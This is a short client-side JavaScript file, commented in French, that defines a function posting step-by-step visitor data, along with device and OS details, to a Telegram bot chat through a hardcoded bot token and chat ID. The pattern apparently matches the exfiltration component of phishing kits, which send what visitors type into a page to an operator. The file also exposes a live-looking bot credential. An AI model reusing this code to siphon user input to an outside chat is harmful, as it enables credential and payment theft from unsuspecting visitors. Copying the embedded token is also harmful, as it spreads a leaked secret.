// public/tg.js
;(function(window){
  // ⚙️ Remplacez ici par vos identifiants Telegram
  const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
  const CHAT_ID   = "-4766781392";
  const API_URL   = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  // Détecte OS et device depuis le user-agent
  function parseUA(ua) {
    const isAndroid = /Android/i.test(ua);
    const isIPhone  = /iPhone/i.test(ua);
    const isWindows = /Windows NT/i.test(ua);
    const isMac     = /Macintosh/i.test(ua);
    let os = 'Inconnu';
    if (isAndroid) os = 'Android';
    else if (isIPhone) os = 'iPhone';
    else if (isWindows) os = 'Windows';
    else if (isMac) os = 'Mac OS';
    const device = isAndroid||isIPhone ? 'Mobile' : 'Desktop';
    return { os, device };
  }

  // Envoi d'un message à Telegram
  async function notifyTelegram(step, payload) {
    try {
      const ua = navigator.userAgent;
      const { os, device } = parseUA(ua);
      const when = new Date().toLocaleString('fr-FR');

      let text = `🆕 *Nouvelle action client*\n`;
      text += `\`${when}\` depuis _client_ (${device}/${os})\n\n`;
      text += `*Étape* : ${step}\n`;
      for (const [k,v] of Object.entries(payload)) {
        text += `• *${k}* : ${v}\n`;
      }

      await fetch(API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          parse_mode: 'Markdown',
          text
        })
      });
    } catch (err) {
      console.warn('notifyTelegram error', err);
    }
  }

  window.notifyTelegram = notifyTelegram;
})(window);